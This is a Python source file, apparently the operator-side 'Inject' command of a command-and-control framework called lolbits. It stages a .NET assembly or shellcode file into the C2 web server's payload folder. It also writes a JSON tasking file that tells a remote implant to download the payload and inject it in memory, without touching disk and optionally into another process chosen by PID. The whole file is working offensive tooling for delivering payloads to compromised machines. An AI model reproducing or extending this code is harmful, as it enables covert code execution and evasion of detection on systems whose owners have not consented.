from command import Command
from shutil import copyfile
from colorama import Fore
import os
import json

class Inject(Command): 


	__payloads = "C:\\inetpub\\wwwroot\\lolbits\\payloads\\"

	def printMessage(self):

		print("Injecting...")

	def printHelp(self):

		helpstr = """\n Download and inject in memory a shellcode (.bin) or PE (dll or exe) from your C&C.
	\n ** USAGE FOR PE **: inject <pe path> <method to execute> [arg1 [arg2]]
	\n ** USAGE FOR SHELLCODE **: inject <shellcode path> [PID]
	\n [+] PE is always injected in the own shell process; shellcode can be injected in a remote process as well.
	\n [+] The payload won't touch disk. The PE must be a .NET assembly.	
		"""

		print(helpstr)
		
	def writeCommandInFile(self, command, prevId, nextId, filePath):
		if len(command) == 0:
			content = {}
			content['NextId'] = nextId
			content['NextAuth'] = ""
			content['Commands'] = command
			with open(filePath, 'w') as f:
				json.dump(content, f)
			return

		path = command[0]
		command[0] = command[-1]
		command = command[:-1]

		content = {}
		content['NextId'] = nextId
		content['NextAuth'] = ""
		content['Commands'] = command
		with open(filePath, 'w') as f:
			json.dump(content, f)
		

		finalPath = self.__payloads + nextId
		copyfile(path, finalPath)

	def executeCommand(self, cmdSpl, prevId, nextId, filePath):

		if cmdSpl[0] == 'help':
			self.printHelp()
		else:
			
			if ".dll" in cmdSpl[0] or ".exe" in cmdSpl[0]:
				cmdSpl.append("inject_pe")
			elif ".bin" in cmdSpl[0]:
				cmdSpl.append("inject_shellcode")
			else:
				print(Fore.RED + "Invalid file type. Select a .NET assembly (dll/exe) or shellcode (.bin) to inject.")
				self.writeCommandInFile([], prevId, nextId, filePath)
				return False
						
			if not os.path.isfile(cmdSpl[0]):
				print(Fore.RED + "File not found.")
				self.writeCommandInFile([], prevId, nextId, filePath)
				return False	
						
			self.printMessage()
			self.writeCommandInFile(cmdSpl, prevId, nextId, filePath)
			return True
